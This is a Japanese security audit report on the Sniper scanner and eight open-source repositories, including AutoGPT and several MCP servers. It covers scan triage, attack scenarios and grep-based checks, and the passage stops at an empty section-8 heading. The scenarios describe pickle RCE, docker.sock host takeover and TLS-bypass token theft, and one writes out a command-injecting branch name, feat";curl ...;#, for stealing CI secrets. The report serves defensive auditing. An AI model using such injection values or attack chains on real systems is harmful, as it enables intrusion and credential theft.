# Gökçe Baran Karakamış — Sniper macOS 導入検証、スキャン済みオープンソースリポジトリおよび検証済みセキュリティアドバイザリ報告書

[English](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.en.md) | [Türkçe](SNIPER-TARANAN-DEPOLAR-VE-BAGLANTILI-ACIKLAR.md) | **日本語** | [简体中文](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.zh-CN.md) | [한국어](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.ko.md)

**著者 / セキュリティ研究者:** **Gökçe Baran Karakamış** ([@dytredline](https://github.com/dytredline))

本包括的技術ガイドおよびセキュリティ調査報告書は、以下の3つの主要パートで構成されています。
1. **第 I 部 — macOS（Apple Silicon）実機環境における導入・動作検証レポート:** Sniper Community を実機の macOS ハードウェア上で **ネイティブソース構成（`--core-only`）** と **Docker Desktop 5エンジン構成（`community-tools`）** の双方でエンドツーエンド検証した結果。
2. **第 II 部 — Sniper でスキャンした8つのオープンソースリポジトリ、脆弱化の仕組みと日常業務シナリオ:** **Gökçe Baran Karakamış** が **Sniper** の静的解析（SAST）、インフラ構成解析（IaC）、および依存関係解析（SCA）エンジンを用いて監査した **8つのオープンソースリポジトリ** のソースコードレベル検証、誤検知（False Positive）の切り分け、コードや設定の欠陥がどのような条件で脆弱性へと変化するのかの平易な解説、各リポジトリにおける **3つの日常的な重大シナリオ（`シナリオ A / B / C`）**、および **実行・検証コマンド例**。
3. **第 III 部 — Sniper スキャンで発見された11件の検証済み脆弱性（`01`..`11`）、コード解析、3つのシナリオとランタイム証明（`RED -> GREEN + BENIGN`）:** 6つのオープンソースプロジェクト（**Stirling-PDF、TryCua `cua`、OpenZiti、n8n、Gotify Server、NIIS X-Road**）で発見され、GitHub Security Advisory（`GHSA`）として報告された **11件の検証済み脆弱性** について、コード上でどのように発生し段階的に悪用可能な脆弱性へと至るのか、各脆弱性に対する **3つの具体的な日常業務シナリオ（`シナリオ A / B / C`）**、**再現・検証コマンド例**、および **防御パッチ（`git diff`）**。

---

## 第 I 部 — macOS（Apple Silicon）実機環境における導入・動作検証レポート（2026-10-24）

macOS（Apple Silicon）上での Sniper の導入は **実験的（Experimental）なものではありません**。**ネイティブソース構成（`--core-only`）** と **Docker Desktop 5エンジン構成** の両方が実機の macOS ハードウェア上でテスト・検証され、正式にサポートされています。

| 導入方式 | 実行コマンド | 実機 macOS ハードウェアで検証された範囲 | 状態 |
| :--- | :--- | :--- | :---: |
| **1. ネイティブ macOS ソース導入（Native Source Setup）** | `python3 scripts/setup-community --core-only` | `.venv`（CPython 3.12）作成、ロック済みランタイムパッケージ（`requirements-runtime.lock` + `pip check`）の導入、`scripts/sniper-mcp --help`、`scripts/sniper-project-audit --help`、`cli_reports.py --help`、ローカルループバック Web UI（`127.0.0.1:8787`）、ローカル SQLite データディレクトリの初期化、およびサンプルプロジェクトに対する実監査の実行 | **実機検証済み（PASS）** |
| **2. Docker Desktop 5エンジン構成（5-Engine Container Stack）** | `python3 scripts/setup-community` *(または `docker compose --profile community-tools up -d`)* | Docker Desktop（Apple Silicon / `linux/arm64`）上での `sniper-community` コアコンテナと5つの補助オープンソースセキュリティエンジン（`zap`、`nuclei`、`trivy`、`httpx`、`katana`）の起動、ヘルスチェック、および共有 `/workspace` ボリューム監査 | **実機検証済み（PASS）** |

### macOS 実機環境で確認された技術的詳細
* **Apple Silicon（`arm64`）ネイティブ Python 環境:** `scripts/setup-community` は macOS 上の Homebrew Python（`3.11+` / `3.12`）を自動検出し、ネイティブ `arm64` wheel パッケージ（`fastapi`、`uvicorn`、`pydantic`、`PyJWT`、`cryptography`、`httpx`、`beautifulsoup4`、`jinja2`）を用いて依存関係競合ゼロ（`pip check: No broken requirements found`）で `.venv` を構築します。
* **エンドツーエンドのローカルプロジェクト監査:** macOS 実機上で実行した `scripts/sniper-project-audit` は、SAST・IaC・SCA の3レイヤーすべてで構造化 JSON レポートおよび SARIF/Markdown 出力をミリ秒〜数秒単位で生成しました。
* **Docker エンジンのマルチアーキテクチャ互換性:** `docker-compose.yml` 内の `community-tools` プロファイルは、Apple Silicon 上の Docker Desktop でネイティブ `arm64` または透過的な Rosetta 2 レイヤーを介して起動し、`127.0.0.1:8787` のループバック境界を維持したまま動作します。

---

## 第 II 部 — Sniper でスキャンした8つのオープンソースリポジトリと関連リスク分析

本パートでは、先行セキュリティ調査において **Sniper** でスキャンを実施した **8つのオープンソースリポジトリ** について、(A) Sniper の生スキャン結果、(B) ソースコード監査で特定された誤検知（False Positive）、(C) 実在するコード・設定上のリスク、(D) **コード内でどのように発生し脆弱性へと変化するのか（誰にでもわかる平易な解説）**、(E) **日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）**、(F) **単独 vs. 連鎖（Chaining）時の深刻度**、および (G) **具体的な実行・検証コマンド例** を詳述します。

---

## 1. AutoGPT (`Significant-Gravitas/AutoGPT`)

### A. Sniper スキャン統計概要
* **閾値超過（高信頼度）検出数:** `93` 件（Critical `2`、High `39`、Medium `49`、Low `3`）
* **トリアージ総検出数:** `142` 件（SAST `61`、IaC `42`、SCA `39`）

### B. ソースコード検証と誤検知（False Positive）の切り分け
1. **誤検知と確認された Critical/High SAST アラート:**
   * `autogpt_platform/backend/backend/executor/manager.py` および `scheduler.py` における **2件の Critical SQL インジェクション（`obj.execute(...)`）** アラートは、SQL クエリではなくブロック実行オブジェクトの Python メソッド呼び出し（`block_obj.execute(input_data)`）であり、**完全な誤検知（False Positive）** です。
   * FastAPI ルーター上の `Security(...)` 依存性注入やテスト用ダミー JWT 文字列に対するハードコード秘密情報アラートも誤検知です。
2. **実在が確認されたコードおよびインフラ所見:**
   * **信頼境界付きの `pickle.loads` デシリアライゼーション:** `autogpt_platform/backend/backend/util/jobstore_backfill.py:67` は、APScheduler のジョブテーブル（`apscheduler_jobs.job_state`）から読み取ったバイナリ列に対して直接 `pickle.loads(job_state)` を実行します。
   * **Docker Compose のデフォルト認証情報と非ルート未設定の Dockerfile:** ローカル・開発用 Compose ファイルにデフォルトの PostgreSQL/Redis パスワードが含まれており、一部のコンテナイメージが `root` ユーザーのまま実行されます。

### D. コード内でどのように発生し脆弱性へ変化するのか（平易な解説）
Python の `pickle.loads()` は、保存されたバイト列から Python オブジェクトを復元する際に、攻撃者が細工した `__reduce__` メソッドを自動的に実行してしまう危険な関数です。通常、`jobstore_backfill.py` は内部の PostgreSQL データベース（`apscheduler_jobs` テーブル）しか読み取りません。しかし、もし開発用 Docker Compose のデフォルトパスワード（`postgres` 等）が本番やステージング環境でそのまま使われていたり、別の SQL インジェクションや SSRF によってデータベースへの書き込み権限が奪われたりすると、攻撃者は悪意ある Pickle ペイロードを `apscheduler_jobs` テーブルに書き込み、バックフィル処理が走った瞬間に **`root` 権限のコンテナ内で任意の OS コマンドを実行（RCE）** できるようになります。

### E. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — デフォルト Compose パスワードのまま公開されたステージング環境での DB 経由 RCE:**
  1. 社内 AI チームが AutoGPT Platform をクラウド VM 上に Docker Compose で構築し、PostgreSQL や Redis のポートが内部ネットワークからデフォルト認証情報のまま到達可能になっている。
  2. 同一 VPC 内の侵害された別サービスから攻撃者が PostgreSQL の `apscheduler_jobs` テーブルに悪意ある `job_state`（`pickle` ペイロード）を挿入する。
  3. `jobstore_backfill.py:67` の `pickle.loads(job_state)` が実行され、`root` コンテナ内で任意コード実行が成立し、登録済みの OpenAI/Anthropic API キーやユーザーデータが窃取される。
* **シナリオ B — 共有 Redis / メッセージブローカー汚染によるワーカー乗っ取り:**
  1. 複数の検証環境が同じ内部ネットワーク上の認証なし Redis インスタンスを共有している。
  2. 攻撃者がジョブキューまたはスケジュール状態のペイロードを書き換え、バックエンド Executor ワーカーに悪意あるジョブを実行させる。
* **シナリオ C — `root` 権限コンテナ内でのカスタムブロック実行によるホストマウント汚染:**
  1. 開発者がローカルまたは共有サーバー上でホストディレクトリをバインドマウントした状態で AutoGPT コンテナを `root` のまま稼働させる。
  2. ワークフロー内で意図しないファイル書き込みが発生した際、`root` 権限のためマウントされたホスト側の設定ファイルやスクリプトが上書きされる。

### F. 単独および連鎖（Chaining）時の深刻度分析
* **単独深刻度:** **Low / Medium**（外部から認証なしで直接 `pickle.loads` に到達するエンドポイントは存在しないため）。
* **連鎖（Chaining）深刻度:** **条件付き Medium / High**（Compose のデフォルト DB パスワード露出 + `apscheduler_jobs` への書き込み + `jobstore_backfill.py` の `pickle.loads` + `root` コンテナが連鎖した場合）。外部から直接悪用可能な未認証脆弱性ではなく、多層防御（Defense-in-Depth）の強化対象です。

### G. 実行・検証コマンド例
```bash
# 1. AutoGPT リポジトリに対する Sniper フル監査の実行
python3 scripts/sniper-project-audit "$HOME/audit-targets/autogpt" --format json --output "$HOME/audit-targets/reports/autogpt-audit.json"

# 2. jobstore_backfill.py 内の pickle.loads 呼び出し箇所の確認
grep -n -C 5 "pickle.loads" "$HOME/audit-targets/autogpt/autogpt_platform/backend/backend/util/jobstore_backfill.py"

# 3. 誤検知と確認された executor/manager.py の .execute() 呼び出しの確認
grep -n -C 5 "\.execute(" "$HOME/audit-targets/autogpt/autogpt_platform/backend/backend/executor/manager.py"
```

---

## 2. Zitadel (`zitadel/zitadel`)

### A. Sniper スキャン統計概要
* **閾値超過（高信頼度）検出数:** `67` 件（Critical `8`、High `42`、Medium `17`）
* **トリアージ総検出数:** `286` 件

### B. ソースコード検証と誤検知（False Positive）の切り分け
1. **8件すべての Critical アラートは誤検知:** Go コード内の `exec.Command` や SQL クエリ構築に関する8件の Critical SAST アラートは、ビルドツール・マイグレーション補助スクリプト内の固定引数呼び出しであり、外部入力が流入しないため **すべて誤検知（False Positive）** です。
2. **実在が確認されたインフラ設定所見:**
   * `deploy/compose/` 配下の3つの開発・テスト用 Docker Compose ファイルでホストの `/var/run/docker.sock` がコンテナにマウントされています。
   * `apps/docs/` 配下のサンプル環境変数設定で `NODE_TLS_REJECT_UNAUTHORIZED=0` が使用されています。

### D. コード内でどのように発生し脆弱性へ変化するのか（平易な解説）
Docker ソケット（`/var/run/docker.sock`）はホスト上の Docker デーモンを直接制御する管理者 API です。これをコンテナ内にマウントすると、そのコンテナ内で動作するプロセスはホスト上の全コンテナの停止・起動や、ホストのルートファイルシステム（`/`）をマウントした特権コンテナの新規起動が可能になります。また、`NODE_TLS_REJECT_UNAUTHORIZED=0` は Node.js の TLS 証明書検証を全面的に無効化するため、サンプル設定をそのまま本番環境へコピーすると中間者攻撃（MITM）に対して無防備になります。

### E. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — 開発用 Compose 構成を流用した共有ステージング環境での `docker.sock` 経由のホスト奪取:**
  1. DevOps チームが `deploy/compose/` の構成をそのまま共有ステージング VM にデプロイし、`/var/run/docker.sock` をマウントした補助コンテナを稼働させる。
  2. その補助コンテナが侵害されると、攻撃者は `/var/run/docker.sock` を通じてホスト OS のファイルシステム全体をマウントした新規コンテナを起動し、Zitadel のマスター鍵と DB 認証情報を奪取する。
* **シナリオ B — ドキュメントの `NODE_TLS_REJECT_UNAUTHORIZED=0` をコピーした本番ポータルでの OIDC トークン盗聴:**
  1. 開発者が `apps/docs/` のサンプル設定を参考にしてフロントエンド/BFF 環境変数に `NODE_TLS_REJECT_UNAUTHORIZED=0` を設定したままデプロイする。
  2. ネットワーク経路上の攻撃者が自己署名証明書を用いて TLS 通信を傍受し、OIDC アクセストークンやクライアントシークレットを平文で取得する。
* **シナリオ C — CI/CD テスト環境でのソケット共有によるビルドキャッシュ汚染:**
  1. セルフホスト CI サーバー上で `docker.sock` マウント付きの Compose テストを実行中、悪意あるテストコードがホストの Docker デーモンを操作して他のジョブのコンテナイメージを改ざんする。

### F. 単独および連鎖（Chaining）時の深刻度分析
* **単独・連鎖深刻度:** **Low / Medium**。`docker.sock`（`deploy/compose/`）と `NODE_TLS_REJECT_UNAUTHORIZED=0`（`apps/docs/`）は別々のサンプル/開発用ファイルに存在し、製品本体の CVE ではなくデプロイテンプレートのハードニング項目です。

### G. 実行・検証コマンド例
```bash
# 1. Zitadel リポジトリに対する Sniper 監査の実行
python3 scripts/sniper-project-audit "$HOME/audit-targets/zitadel" --format json --output "$HOME/audit-targets/reports/zitadel-audit.json"

# 2. Compose ファイル内の docker.sock マウント箇所の確認
grep -rn "docker.sock" "$HOME/audit-targets/zitadel/deploy/"

# 3. ドキュメント内の NODE_TLS_REJECT_UNAUTHORIZED 設定箇所の確認
grep -rn "NODE_TLS_REJECT_UNAUTHORIZED" "$HOME/audit-targets/zitadel/apps/docs/"
```

---

## 3. Nextcloud MCP Server (`cbcoutinho/nextcloud-mcp-server`)

### A. Sniper スキャン統計概要
* **閾値超過（高信頼度）検出数:** `59` 件（SAST Critical `1` / High `6`、IaC High `7`、SCA Critical `5` / High `40`）

### B. ソースコード検証と誤検知（False Positive）の切り分け
1. **SSRF アラート（`nextcloud_mcp_server/auth/login_flow.py:192`）は誤検知:** Sniper は `poll_endpoint` に対する HTTP リクエストを SSRF 候補として検出しましたが、直前の `initiate()` メソッド内で `_rewrite_to_nextcloud_host(poll_endpoint, self.nextcloud_host)` が呼ばれており、スキーム・ホスト・ポートがすべて設定済みの `self.nextcloud_host` に強制書き換えされるため、外部ホストへの SSRF は発生しません。
2. **JWT アラート（`token_utils.py`）は意図されたトークンインスペクタ:** `verify_signature=False` は検証済みトークンまたはメタデータ表示用のヘルパーであり、認証バイパスではありません。
3. **GitHub Actions ワークフロー（`.github/workflows/pact.yml`）:** ブランチ名のシェル展開がありますが、`if: github.event.pull_request.head.repo.full_name == github.repository` によって外部フォークからの PR はブロックされています。

### D. コード内でどのように発生し脆弱性へ変化するのか（平易な解説）
OAuth / Login Flow v2 では、サーバーが返す `poll.endpoint` URL に対してクライアントがポーリングを行います。もしクライアントがサーバーから返された URL をそのまま信じてリクエストすると、悪意あるレスポンスによって内部ネットワーク（`169.254.169.254` 等）へリクエストが誘導される SSRF になります。本リポジトリでは `_rewrite_to_nextcloud_host()` で接続先オリジンを固定することでこれを防いでいます。一方、`.github/workflows/pact.yml` では同一リポジトリ内のブランチ名がシェルに直接展開されるため、リポジトリへの書き込み権限を持つアカウントが侵害された場合に限り、CI ランナー上でコマンド注入が可能になります。

### E. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — 同一リポジトリのブランチ名を用いた CI ワークフロー（`pact.yml`）でのシークレット漏洩:**
  1. 開発者の個人アクセストークン（PAT）が漏洩し、攻撃者がリポジトリ内に `feat";curl ...;#` のようなブランチを作成して PR を開く。
  2. `same-repo` 条件を通過した `pact.yml` がブランチ名を bash スクリプト内で展開し、CI シークレットが外部へ送信される。
* **シナリオ B — 古いロックファイル依存関係（SCA）を含んだままのコンテナ公開:**
  1. チームが MCP サーバーを HTTP/SSE モードで社内ネットワークに公開する際、更新されていない Python 依存パッケージの既知の脆弱性（SCA 検出分）が攻撃面に露出する。
* **シナリオ C — カスタム認証フォークで `_rewrite_to_nextcloud_host()` を削除した場合の SSRF 再発:**
  1. 開発者がリバースプロキシ対応のために `_rewrite_to_nextcloud_host()` のオリジン固定処理を削除すると、`poll_endpoint` が任意の内部 URL を指せるようになり SSRF が発生する。

### F. 単独および連鎖（Chaining）時の深刻度分析
* **単独・連鎖深刻度:** **Low**。プロダクション SAST 脆弱性は存在せず、CI の環境変数パラメータ化および依存関係更新のみが推奨されます。

### G. 実行・検証コマンド例
```bash
# 1. Nextcloud MCP Server に対する Sniper 監査の実行
python3 scripts/sniper-project-audit "$HOME/audit-targets/nextcloud-mcp" --format json --output "$HOME/audit-targets/reports/nextcloud-mcp-audit.json"

# 2. login_flow.py 内の _rewrite_to_nextcloud_host 防御ロジックの確認
grep -n -C 12 "_rewrite_to_nextcloud_host" "$HOME/audit-targets/nextcloud-mcp/nextcloud_mcp_server/auth/login_flow.py"

# 3. pact.yml の same-repo ガード条件の確認
grep -n -C 8 "head.repo.full_name" "$HOME/audit-targets/nextcloud-mcp/.github/workflows/pact.yml"
```

---

## 4. MCPJam Inspector (`MCPJam/inspector`)

### A. Sniper スキャン統計概要
* **閾値超過（高信頼度）検出数:** `122` 件（SAST Critical `12` / High `8`、SCA Critical `6` / High `96`）

### B. ソースコード検証と誤検知（False Positive）の切り分け
* **20件の Critical/High SAST アラートのうち18件は完全な誤検知:** 14件はコメント内の英語表現 `eval (` / `exec (` に反応したもの、2件は TypeScript 型定義ファイル（`.d.ts`）、2件はフロントエンド UI のラベル文字列連結でした。
* **実在が確認された所見:** `.github/workflows/pr-preview.yml` における同一リポジトリ限定（`same-repo` ガード付き）のブランチ名シェル展開と、ロックファイル内の SCA 依存関係アラートです。

### D. コード内でどのように発生し脆弱性へ変化するのか（平易な解説）
MCPJam Inspector は開発者がローカルの MCP サーバーをブラウザ上でテスト・デバッグするためのツールです。CI ワークフロー `pr-preview.yml` では PR プレビュー環境を作成する際にブランチ名をスクリプトへ埋め込んでいます。外部フォークからの PR は `head.repo.full_name == github.repository` で遮断されていますが、環境変数（`env:`）経由ではなく直接 `${{ ... }}` で展開しているため、内部ブランチ名によるシェルインジェクションの余地が残っています。また、`npm` ロックファイル内の多数のトランジティブ依存関係（SCA）は、Inspector を共有サーバー上でホストする場合に更新が必要です。

### E. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — 内部コントリビュータ権限を用いた `pr-preview.yml` でのプレビュー環境シークレット取得:**
  1. リポジトリにブランチ作成権限を持つアカウントが特殊文字を含むブランチ名で PR を作成する。
  2. プレビューデプロイ用ワークフローがブランチ名をシェル展開し、クラウドプレビュー環境のデプロイトークンが露出する。
* **シナリオ B — 共有デバッグサーバーとして公開された Inspector の古い npm パッケージ悪用:**
  1. 開発チームが MCPJam Inspector を社内共有サーバー上で常時稼働させ、古いフロントエンド/サーバー依存パッケージの脆弱性が内部ネットワークに露出する。
* **シナリオ C — 悪意ある外部 MCP サーバー出力のインスペクタ表示時の DOM 処理リスク:**
  1. 開発者が信頼できないサードパーティ MCP サーバーに接続してレスポンスを検査する際、古い UI 依存ライブラリを介して予期しないスクリプト動作が発生する。

### F. 単独および連鎖（Chaining）時の深刻度分析
* **単独・連鎖深刻度:** **Low / Medium**。外部フォーク PR は遮断されており、内部 CI ハードニングと SCA パッケージ更新が推奨事項です。

### G. 実行・検証コマンド例
```bash
# 1. MCPJam Inspector に対する Sniper 監査の実行
python3 scripts/sniper-project-audit "$HOME/audit-targets/mcpjam-inspector" --format json --output "$HOME/audit-targets/reports/mcpjam-inspector-audit.json"

# 2. pr-preview.yml の条件式とスクリプト展開箇所の確認
grep -n -C 10 "pull_request" "$HOME/audit-targets/mcpjam-inspector/.github/workflows/pr-preview.yml"
```

---

## 5. Codebase Memory MCP (`DeusData/codebase-memory-mcp`)

### A. Sniper スキャン統計概要
* **閾値超過（高信頼度）検出数:** `32` 件（SAST Critical `17` / High `7`、SCA High `8`）

### B. ソースコード検証と誤検知（False Positive）の切り分け
* **17件すべての Critical SAST アラートは誤検知:**
  * `src/store/store.c:2864` の SQL インジェクションアラートは、プログラム内部の固定テーブル名配列と `sqlite3_prepare_v2` パラメータバインディング（`?`）を使用しており安全です。
  * `src/lang/c_lsp.h:54` はコメント行、`kotlin_lsp.c` / `py_lsp.c` / `store.c:4482` はすべて `snprintf` や固定長境界チェック付きのバッファ操作であり、`xmalloc.c` や `mcp.c` も安全なラッパー実装です。
  * `src/http/http_server.c` には `localhost` / `127.0.0.1` のみに限定した厳格な `Host` ヘッダー検証（違反時は HTTP `403 Forbidden`）と CORS オリジン検証が実装されており、ブラウザからのドライブバイ攻撃や DNS Rebinding は成立しません。

### D. コード内でどのように発生し脆弱性へ変化するのか（平易な解説）
C 言語のプログラムでは、`sprintf` や境界チェックのないメモリコピーを使うとバッファオーバーフローになり、SQL 文字列を直接連結すると SQL インジェクションになります。また、ローカル HTTP サーバーが `Host` ヘッダーや `Origin` ヘッダーを検証しないと、ブラウザで悪意あるサイトを開いた際にローカルのソースコードインデックスが盗まれる危険があります。しかし `codebase-memory-mcp` の実際の C ソースコードを精査すると、SQL はプリペアドステートメントで処理され、文字列は `snprintf(buf, sizeof(buf), ...)` で上限が守られ、`http_server.c` は非ローカルの `Host` / `Origin` を `403` で拒否しているため、これらが脆弱性に変化することはありません。

### E. 日常業務で発生し得る3つの重大シナリオ（もし防御実装が外された場合の境界シナリオ `シナリオ A / B / C`）
* **シナリオ A — リバースプロキシ経由でローカル HTTP ポートを LAN に転送した場合のインデックス閲覧:**
  1. 開発者が `http_server.c` のローカルポートを `socat` や `nginx`（`Host: localhost` 書き換え付き）で社内 LAN に公開してしまう。
  2. この場合、`http_server.c` の `Host: localhost` チェックがプロキシによって満たされるため、同一 LAN 上の第三者がコードグラフを検索できるようになる。
* **シナリオ B — 共有マルチユーザー Linux サーバー上でのローカルループバック共有:**
  1. 1台の Linux 開発サーバーに複数の開発者が SSH ログインして作業している。
  2. あるユーザーが起動した `127.0.0.1` ポートには同一マシン上の別 OS ユーザーからも接続可能であるため、`/home/community-user/private-project` のインデックス情報にローカルプロセスからアクセスされる可能性がある。
* **シナリオ C — 大規模リポジトリの初回インデックス作成時の CPU / I/O 負荷:**
  1. 数百万行規模のモノレポとビルド成果物ディレクトリ（`node_modules` や `target`）を除外せずにインデックス化すると、SQLite トランザクションと LSP パーサーがローカル CPU とディスク I/O を一時的に占有する。

### F. 単独および連鎖（Chaining）時の深刻度分析
* **単独・連鎖深刻度:** **Low**。ブラウザ経由のリモートコード漏洩チェーンは `http_server.c` の `Host` + CORS 防御により成立しません。

### G. 実行・検証コマンド例
```bash
# 1. Codebase Memory MCP に対する Sniper 監査の実行
python3 scripts/sniper-project-audit "$HOME/audit-targets/codebase-memory-mcp" --format json --output "$HOME/audit-targets/reports/codebase-memory-mcp-audit.json"

# 2. http_server.c 内の Host ヘッダー検証（403 Forbidden）と CORS 防御の確認
grep -n -C 15 "403" "$HOME/audit-targets/codebase-memory-mcp/src/http/http_server.c"

# 3. store.c:2864 周辺の sqlite3 パラメータバインディング実装の確認
sed -n '2850,2880p' "$HOME/audit-targets/codebase-memory-mcp/src/store/store.c"
```

---

## 6. GitLab MCP Server (`yoda-digital/gitlab-mcp-server`)

### A. Sniper スキャン統計概要
* **閾値超過（高信頼度）検出数:** `5` 件（Critical `0`、High `4`、Medium `1`）

### B. ソースコード検証と誤検知（False Positive）の切り分け
* `recorder.go` および `make.go` におけるファイル操作・コマンド実行アラートはテスト記録およびビルド補助ツールであり誤検知です。
* 実在する唯一のセキュリティ設定所見は、ユーザーが明示的に環境変数 `GITLAB_MCP_SKIP_TLS_VERIFY=true` を設定した場合に `InsecureSkipVerify: true` が有効になるオプトイン機能です。

### D. コード内でどのように発生し脆弱性へ変化するのか（平易な解説）
社内 GitLab サーバーが自己署名証明書（Self-Signed Certificate）を使っている場合、開発者は手っ取り早く接続エラーを消すために `GITLAB_MCP_SKIP_TLS_VERIFY=true` を設定しがちです。このフラグを有効にすると、Go の HTTP クライアントは接続先サーバーの TLS 証明書が本物かどうかを一切確認しなくなります。その結果、開発者が外出先の Wi-Fi 等で IDE を開いた際、通信経路上の攻撃者（MITM）が偽の GitLab サーバーになりすましてリクエストを受け取り、ヘッダーに含まれる `PRIVATE-TOKEN` や `Authorization: Bearer glpat-...` トークンをそのまま盗み取ることが可能になります。

### E. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — 社内自己署名 GitLab 用に `GITLAB_MCP_SKIP_TLS_VERIFY=true` を設定した開発者がカフェ/ホテルの Wi-Fi でトークンを奪われる:**
  1. エンジニアが社内 GitLab の証明書エラーを回避するため、IDE の MCP 設定に `GITLAB_MCP_SKIP_TLS_VERIFY=true` を追加する。
  2. 出張先のホテルやカフェの Wi-Fi で IDE を起動した際、MCP サーバーが GitLab へ接続を試み、同一ネットワーク上の攻撃者が偽証明書で応答して `glpat-...` パーソナルアクセストークンを窃取する。
* **シナリオ B — チーム共有ドキュメントでの非安全な MCP 設定テンプレートの拡散:**
  1. チームのオンボーディング資料で `claude_desktop_config.json` のサンプルに最初から `GITLAB_MCP_SKIP_TLS_VERIFY=true` が記載され、全員に配布される。
  2. 正規の TLS 証明書を持つ本番 GitLab インスタンスへの通信まで恒久的に証明書検証なしとなり、組織全体のソースコード・PR 操作権限が MITM リスクに晒される。
* **シナリオ C — 企業プロキシ（TLS インスペクション）環境でのルート CA 登録省略による検証無効化:**
  1. 社内プロキシのルート CA 証明書を `SSL_CERT_FILE` に登録する代わりに、CI エージェント上で `GITLAB_MCP_SKIP_TLS_VERIFY=true` を有効化してしまい、偽装エンドポイントへの接続を許す。

### F. 単独および連鎖（Chaining）時の深刻度分析
* **単独・連鎖深刻度:** **Low**。デフォルトでは TLS 検証は有効（`false`）であり、連鎖する他の脆弱性も存在しません。

### G. 実行・検証コマンド例
```bash
# 1. GitLab MCP Server に対する Sniper 監査の実行
python3 scripts/sniper-project-audit "$HOME/audit-targets/gitlab-mcp-server" --format json --output "$HOME/audit-targets/reports/gitlab-mcp-server-audit.json"

# 2. GITLAB_MCP_SKIP_TLS_VERIFY と InsecureSkipVerify の実装箇所の確認
grep -rn -C 8 "GITLAB_MCP_SKIP_TLS_VERIFY" "$HOME/audit-targets/gitlab-mcp-server/"
```

---

## 7. Apktool MCP (`zinja-coder/apktool-mcp-server`)

### A. Sniper スキャン統計概要
* **閾値超過（高信頼度）検出数:** `16` 件（SAST Medium `1`、SCA Critical `4` / High `12`）

### B. ソースコード検証と誤検知（False Positive）の切り分け
* ファーストパーティ Python コードには Critical/High の SAST 脆弱性（コマンドインジェクション等）は存在せず、1件の Medium アラートは誤検知です。
* 一方、`uv.lock` 内にロックされているサードパーティパッケージ（`authlib 1.6.8`、`cryptography 46.0.5`、`pyjwt 2.11.0`、`python-multipart 0.0.20`、`starlette 0.47.3`、`urllib3 2.5.0` 等）に対して **Critical 4件、High 12件の SCA 依存関係レコード** が検出されました。

### D. コード内でどのように発生し脆弱性へ変化するのか（平易な解説）
自身の Python コードにバグがなくても、`uv.lock` で古いバージョンのライブラリ（`starlette`、`python-multipart`、`authlib` 等）が固定されていると、`uv sync --frozen` を実行したすべての環境に既知の脆弱性を持つライブラリがそのままインストールされます。ローカルの `stdio` モードで個人利用する分には影響は限定的ですが、MCP サーバーを HTTP/SSE モードでネットワーク越しに公開したり、不特定の外部 APK 解析パイプラインに組み込んだりすると、下層ライブラリの認証不備や DoS 脆弱性が直接悪用可能になります。

### E. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — ネットワーク公開されたリモート APK 解析 MCP サーバーにおける `authlib` / `pyjwt` の認証検証不備:**
  1. セキュリティチームが Apktool MCP を社内共有サーバー上で HTTP/SSE トランスポートとして公開し、JWT ベースのアクセス制御を有効化する。
  2. `uv.lock` 内の古い `authlib 1.6.8` / `pyjwt 2.11.0` の既知のトークン検証不備を突かれ、未承認クライアントからデコンパイル API が呼び出される。
* **シナリオ B — `python-multipart 0.0.20` / `starlette 0.47.3` を介した異常なマルチパートリクエストによるサービス停止（DoS）:**
  1. HTTP エンドポイントに対して細工されたマルチパート境界（boundary）を持つリクエストが送信される。
  2. 古い `python-multipart` パーサーが過剰な CPU・メモリを消費し、MCP サーバープロセスがハングする。
* **シナリオ C — 悪意ある APK ファイルの逆アセンブル時におけるリソース枯渇（Zip Bomb / 大量リソース展開）:**
  1. マルウェア解析担当者が極端に圧縮率の高い APK（Zip Bomb 構造）を Apktool MCP に渡す。
  2. 下層の展開処理がディスク容量とメモリを使い果たし、解析ワークステーションが一時停止する。

### F. 単独および連鎖（Chaining）時の深刻度分析
* **単独・連鎖深刻度:** **Low / Medium（SCA）**。ファーストパーティ SAST はクリーンであり、`uv lock --upgrade` による依存パッケージ更新が推奨されます。

### G. 実行・検証コマンド例
```bash
# 1. Apktool MCP に対する Sniper 監査の実行
python3 scripts/sniper-project-audit "$HOME/audit-targets/apktool-mcp" --format json --output "$HOME/audit-targets/reports/apktool-mcp-audit.json"

# 2. uv.lock 内の主要パッケージバージョンの確認
grep -n -A 2 -E 'name = "(authlib|cryptography|pyjwt|python-multipart|starlette|urllib3)"' "$HOME/audit-targets/apktool-mcp/uv.lock"

# 3. Sniper CLI レポートツールで High 以上の検出項目を一覧表示
python3 cli_reports.py --input "$HOME/audit-targets/reports/apktool-mcp-audit.json" --min-severity high
```

---

## 8. JADX MCP (`zinja-coder/jadx-mcp-server`)

### A. Sniper スキャン統計概要
* **閾値超過（高信頼度）検出数:** `32` 件（SAST Medium `3`、SCA Critical `6` / High `26`）

### B. ソースコード検証と誤検知（False Positive）の切り分け
* ファーストパーティ Python コードに Critical/High の SAST 脆弱性はなく、3件の Medium アラートもローカル JADX ブリッジ通信に関するもので悪用可能な脆弱性ではありません。
* `uv.lock` 内のロック済み依存関係に対して **Critical 6件、High 26件の SCA 脆弱性レコード**（`authlib 1.6.8`、`pyjwt 2.11.0`、`cryptography 46.0.5`、`python-multipart 0.0.20`、`starlette 0.47.3`、`urllib3 2.5.0` 等）が検出されました。

### D. コード内でどのように発生し脆弱性へ変化するのか（平易な解説）
JADX MCP は、リバースエンジニアリングツール JADX で開いている Android アプリのコードを AI アシスタントへ渡すブリッジサーバーです。ユーザーが `uv sync` で環境を構築すると、`uv.lock` に記載された脆弱な旧バージョンの HTTP/認証フレームワークがそのまま導入されます。JADX MCP をリモート解析サーバー上で HTTP/SSE モードで稼働させた場合、ファーストパーティコードに問題がなくても、基盤となる `starlette` や `authlib`、`urllib3` の既知の脆弱性を突かれるリスクが生じます。

### E. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
